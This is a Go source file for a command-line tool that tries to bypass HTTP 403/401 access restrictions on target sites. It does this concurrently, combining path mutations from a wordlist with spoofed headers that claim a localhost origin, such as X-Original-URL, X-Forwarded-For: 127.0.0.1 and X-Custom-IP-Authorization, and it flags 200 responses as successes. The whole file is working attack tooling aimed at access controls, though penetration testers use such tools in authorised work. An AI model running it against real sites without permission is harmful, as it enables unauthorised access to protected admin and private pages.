package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

const banner = `
_____ ________________     ____  __
__  // /_  __ \_|__  /     __  |/ /
_  // /_  / / /__/_ <________    / 
/__  __/ /_/ /____/ //_____/    |  
  /_/  \____/ /____/       /_/|_|  
                                   
by Whoamikiddie
`

// --> random user agent
func randomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
	}
	return userAgents[0] // Extend with randomness if desired
}

// --> wordlist read as file
func wordList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file '%s': %v", filename, err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file '%s': %v", filename, err)
	}
	return lines, nil
}

// --> header payloads
func headerBypass(path string) []map[string]string {
	if path == "" {
		path = "/"
	}
	return []map[string]string{
		{"User-Agent": randomUserAgent()},
		{"User-Agent": randomUserAgent(), "X-Original-URL": path},
		{"User-Agent": randomUserAgent(), "X-Custom-IP-Authorization": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-For": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-For": "127.0.0.1:80"},
		{"User-Agent": randomUserAgent(), "X-Originally-Forwarded-For": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Originating-": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Originating-IP": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "True-Client-IP": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-WAP-Profile": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Arbitrary": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-HTTP-DestinationURL": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-Proto": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "Destination": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Remote-IP": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Client-IP": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Host": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-Host": "http://127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-ProxyUser-Ip": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "X-rewrite-url": path},
		{"User-Agent": randomUserAgent(), "X-Real-IP": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "CF-Connecting-IP": "127.0.0.1"},
		{"User-Agent": randomUserAgent(), "Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
	}
}

// --> Ports payloads
func portBasedBypass() []map[string]string {
	return []map[string]string{
		{"User-Agent": randomUserAgent(), "X-Forwarded-Port": "443"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-Port": "80"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-Port": "8080"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-Port": "8443"},
		{"User-Agent": randomUserAgent(), "X-Forwarded-Port": "3128"},
	}
}

// Perform Do Req
func doRequest(urlStr string, headers map[string]string, timeout time.Duration, verbose bool) {
	client := &http.Client{
		Timeout: timeout,
	}

	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		logError(fmt.Sprintf("Failed to create request for %s: %v", urlStr, err), verbose)
		return
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		if verbose {
			logError(fmt.Sprintf("Network error for %s: %v", urlStr, err), true)
		}
		return
	}
	defer resp.Body.Close()

	lastHeader := ""
	for k, v := range headers {
		if k != "User-Agent" {
			lastHeader = fmt.Sprintf("%s: %s", k, v)
			break
		}
	}

	switch resp.StatusCode {
	case 200:
		color.Green("[SUCCESS] %s %s [%d]", urlStr, lastHeader, resp.StatusCode)
	case 403, 401:
		color.Yellow("[CHECK] %s %s [%d]", urlStr, lastHeader, resp.StatusCode)
	default:
		color.Red("[FAIL] %s %s [%d]", urlStr, lastHeader, resp.StatusCode)
	}
}

// --> conncurent worker
func worker(jobs <-chan string, headersList []map[string]string, timeout time.Duration, verbose bool, wg *sync.WaitGroup) {
	defer wg.Done()
	for urlStr := range jobs {
		for _, headers := range headersList {
			doRequest(urlStr, headers, timeout, verbose)
		}
	}
}

func constructURL(base, path, bypass string) string {
	if path != "" {
		return fmt.Sprintf("%s/%s%s", base, path, bypass)
	}
	return base + bypass
}

func validateURL(urlStr string) error {
	parsedURL, err := url.ParseRequestURI(urlStr)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}
	if parsedURL.Scheme == "" || parsedURL.Host == "" {
		return fmt.Errorf("missing scheme or host")
	}
	// Additional validation: check for invalid characters
	if strings.ContainsAny(urlStr, " \t\n\r") {
		return fmt.Errorf("contains invalid whitespace characters")
	}
	return nil
}

func logError(message string, verbose bool) {
	if verbose {
		color.Red("[ERROR] %s", message)
	}
}

func mainLogic(wordlist []string, domains, target, path string, workers int, timeout time.Duration, verbose bool) {
	var wg sync.WaitGroup
	jobs := make(chan string, 100)

	// Combine all payloads
	headersList := append(headerBypass(path), portBasedBypass()...)

	// Track statistics
	var mu sync.Mutex
	skipped := 0
	processed := 0
	seenInvalid := make(map[string]bool)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(jobs, headersList, timeout, verbose, &wg)
	}

	addURL := func(base, bypass string) {
		urlStr := constructURL(base, path, bypass)
		if err := validateURL(urlStr); err != nil {
			mu.Lock()
			if !seenInvalid[bypass] {
				if verbose {
					logError(fmt.Sprintf("Skipping URL '%s' with bypass '%s': %v", urlStr, bypass, err), true)
				}
				seenInvalid[bypass] = true
			}
			skipped++
			mu.Unlock()
			return
		}
		jobs <- urlStr
		mu.Lock()
		processed++
		mu.Unlock()
	}

	if domains != "" {
		color.Cyan("Checking domains from %s...", domains)
		checklist, err := wordList(domains)
		if err != nil {
			logError(fmt.Sprintf("Error loading domains file: %v", err), true)
		} else if len(checklist) == 0 {
			logError(fmt.Sprintf("No valid domains found in %s", domains), true)
		} else {
			for _, line := range checklist {
				for _, bypass := range wordlist {
					addURL(line, bypass)
				}
			}
		}
	}

	if target != "" {
		color.Cyan("Checking target %s...", target)
		for _, bypass := range wordlist {
			addURL(target, bypass)
		}
	}

	close(jobs)
	wg.Wait()

	color.Cyan("Summary: Processed %d URLs, Skipped %d invalid URLs", processed, skipped)
}

func main() {
	// Print the banner in bright purple
	color.New(color.FgHiMagenta).Println(banner)

	path := flag.String("p", "", "Path to check (e.g., admin)")
	domains := flag.String("d", "", "File with domains to check (e.g., domains.txt)")
	target := flag.String("t", "", "Single domain to check (e.g., http://example.com)")
	workers := flag.Int("w", 10, "Number of concurrent workers")
	timeout := flag.Duration("timeout", 10*time.Second, "HTTP request timeout (e.g., 5s)")
	verbose := flag.Bool("v", false, "Verbose mode to show detailed errors")
	flag.Parse()

	if *domains == "" && *target == "" {
		color.Red("Error: You must specify either -d (domains file) or -t (target)")
		flag.Usage()
		os.Exit(1)
	}

	wordlist, err := wordList("bypasses.txt")
	if err != nil {
		logError(fmt.Sprintf("Error loading bypasses.txt: %v", err), true)
		os.Exit(1)
	}
	if len(wordlist) == 0 {
		logError("No valid bypasses found in bypasses.txt", true)
		os.Exit(1)
	}

	mainLogic(wordlist, *domains, *target, *path, *workers, *timeout, *verbose)
}
